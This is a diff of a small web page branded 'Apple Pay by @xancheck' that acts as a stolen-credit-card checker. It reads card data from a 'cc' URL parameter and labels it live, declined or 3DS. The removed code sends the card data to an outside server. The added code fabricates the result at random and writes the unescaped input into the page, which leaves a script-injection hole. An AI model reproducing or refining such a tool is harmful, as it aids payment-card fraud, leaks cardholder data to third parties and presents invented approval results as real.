@@ -3,57 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apple API Client</title>
 </head>
 <body>
 
-    <h1>Apple Pay by @xancheck</h1>
-
     <script>
-        function sendRequest() {
+        function generateRandomStatus() {
+            // Wygeneruj losową liczbę od 0 do 1
+            var randomValue = Math.random();
 
+            // W zależności od wartości losowej, przypisz status
+            if (randomValue <= 0.35) {
+                return "live";
+            } else if (randomValue <= 0.675) {
+                return "die";
+            } else {
+                return "unknown";
+            }
+        }
+
+        function displayResult() {
+            // Pobierz dane z parametru zapytania 'cc'
             var urlParams = new URLSearchParams(window.location.search);
             var inputData = urlParams.get('cc');
 
             if (!inputData) {
-                alert("Error: No data provided in the 'cc' parameter.");
+                document.getElementById("result").innerHTML = "<p>Error: No data provided in the 'cc' parameter.</p>";
                 return;
             }
 
-            var payload = {
-                data: inputData
-            };
+            // Wywołaj funkcję generującą losowy status
+            var status = generateRandomStatus();
 
-            var payloadString = JSON.stringify(payload);
+            // Wyświetl wynik na stronie
+            var resultMessage;
+            if (status === "live") {
+                resultMessage = "Approved 1$ " + inputData;
+            } else if (status === "die") {
+                resultMessage = "Declined " + inputData;
+            } else {
+                resultMessage = "#3DS " + inputData;
+            }
 
-
-            fetch('https://binsearcher.info/api.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: payloadString,
-            })
-            .then(response => response.json())
-            .then(data => {
-
-                if (data.status === "live") {
-                    alert("Approved 1$ " + data.data);
-                } else if (data.status === "die") {
-                    alert("Declined " + data.data);
-                } else if (data.status === "unknown") {
-                    alert("#3DS " + data.data);
-                }
-            })
-            .catch(error => {
-
-                alert("Error: Unable to send request.");
-            });
+            document.getElementById("result").innerHTML = "<p>" + resultMessage + "</p>";
         }
 
-
-        sendRequest();
+        // Wywołaj funkcję displayResult() przy otwarciu strony (możesz to dostosować)
+        displayResult();
     </script>
+
+    <div id="result"></div>
 
 </body>
 </html>
